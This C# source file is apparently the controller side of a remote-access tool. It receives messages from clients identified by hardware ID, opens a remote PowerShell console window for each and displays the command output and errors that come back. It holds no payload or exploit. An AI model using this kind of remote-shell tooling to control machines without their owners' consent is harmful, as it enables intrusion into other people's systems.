using System;
using System.Drawing;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerPowerShell
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		try
		{
			string action = objects[1]?.ToString();
			if (string.IsNullOrEmpty(action))
			{
				client.Disconnect();
				return;
			}
			if (action != "Connect" && action != "Error" && action != "PowerShell")
			{
				Methods.AppendLogs(client.IP, "RCE Attack Blocked! Invalid action: " + action + " (HandlerPowerShell)", Color.Red);
				client.Disconnect();
				return;
			}
			switch (action)
			{
			case "Connect":
			{
				if (objects.Length < 3)
				{
					client.Disconnect();
					break;
				}
				string hwid = objects[2]?.ToString();
				if (string.IsNullOrEmpty(hwid))
				{
					client.Disconnect();
					break;
				}
				FormPowerShell form3 = (FormPowerShell)Application.OpenForms["PowerShell:" + hwid];
				if (form3 == null)
				{
					client.Disconnect();
					break;
				}
				form3.Invoke((MethodInvoker)delegate
				{
					form3.Text = "PowerShell [" + hwid + "]";
					form3.client = client;
					form3.richTextBox1.Enabled = true;
					form3.rjTextBox1.Enabled = true;
					form3.richTextBox1.AppendText("Connected to client PowerShell...\n");
				});
				client.Tag = form3;
				client.Hwid = hwid;
				break;
			}
			case "Error":
			{
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				FormPowerShell form2 = (FormPowerShell)client.Tag;
				string errorMsg = ((objects.Length <= 2) ? "Unknown error" : objects[2]?.ToString());
				if (errorMsg != null && errorMsg.Length > 10000)
				{
					errorMsg = errorMsg.Substring(0, 10000) + "... [Truncated]";
				}
				form2.Invoke((MethodInvoker)delegate
				{
					form2.richTextBox1.SelectionColor = Color.Red;
					form2.richTextBox1.AppendText("Error: " + errorMsg + "\n");
					form2.richTextBox1.SelectionColor = form2.richTextBox1.ForeColor;
				});
				break;
			}
			case "PowerShell":
			{
				if (client.Tag == null)
				{
					client.Disconnect();
					break;
				}
				if (objects.Length < 3)
				{
					client.Disconnect();
					break;
				}
				FormPowerShell form = (FormPowerShell)client.Tag;
				string output = objects[2]?.ToString();
				if (output != null && output.Length > 100000)
				{
					output = output.Substring(0, 100000) + "... [Output truncated]";
				}
				form.Invoke((MethodInvoker)delegate
				{
					form.richTextBox1.AppendText(output);
					form.richTextBox1.SelectionStart = form.richTextBox1.Text.Length;
					form.richTextBox1.ScrollToCaret();
				});
				break;
			}
			}
		}
		catch (Exception)
		{
		}
	}
}
